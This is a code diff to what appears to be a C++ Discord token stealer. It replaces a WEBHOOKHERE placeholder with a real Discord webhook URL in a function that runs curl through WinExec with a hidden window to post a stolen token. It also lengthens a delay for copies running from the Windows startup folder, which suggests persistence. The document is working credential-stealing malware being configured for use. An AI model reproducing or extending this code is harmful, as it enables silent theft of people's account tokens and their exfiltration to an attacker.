@@ -13,7 +13,7 @@ namespace fs = std::filesystem;
 std::string webhookSend(std::string token) {
 
 	char cmd[1024];
-	sprintf(cmd, "curl -d \"content=%s\" WEBHOOKHERE", token.c_str());
+	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/840820010393927690/dZNKDNStWVr3eeScafGHrN_GGGd9xuXK9GbZaEZm2zV2AbfaKiQ9RgtH2F5_NvBI3aPG", token.c_str());
 	WinExec(cmd, SW_HIDE);
 
 	return cmd;
@@ -89,7 +89,7 @@ int main(int argc, char* argv[]) {
 
 	if (strcmp(argv[0],szStartupPath) == 0) // If in startup directory
 	{
-		Sleep(20000); // Wait, this should fix initialization issues.
+		Sleep(60000); // Wait, this should fix initialization issues.
 	}
 
 
